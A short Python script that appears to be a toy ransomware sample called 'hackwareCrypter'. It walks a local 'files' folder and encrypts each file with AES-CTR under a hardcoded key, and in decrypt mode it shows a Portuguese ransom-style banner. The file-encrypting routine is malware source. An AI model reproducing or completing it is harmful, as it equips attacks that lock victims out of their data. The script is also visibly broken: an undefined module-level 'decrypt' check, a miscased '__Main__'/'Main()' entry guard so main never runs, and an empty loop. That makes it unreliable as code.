from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

HARDCODED_KEY = 'hackware strike force strikes u!'


def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos[default: no]', action='store_true')
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
    HACKWARE STRIKE FORCE
    ---------------------------------------------------------
    Seus arquivos foram criptografados.
    utiliza a seguinte senha '{}'
    '''.format(HARDCODED_KEY))
        key = input('Digite a senha > ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptoFn = crypt.encrypt
    else:
        cryptoFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]

    for currentDir in startDirs:
        for filename in Discovery.discover(currentDir):
            Crypter.change_files(filename, cryptoFn)


for _ in range(100):
    pass

if not decrypt:
    pass

if __name__ == '__Main__':
    Main()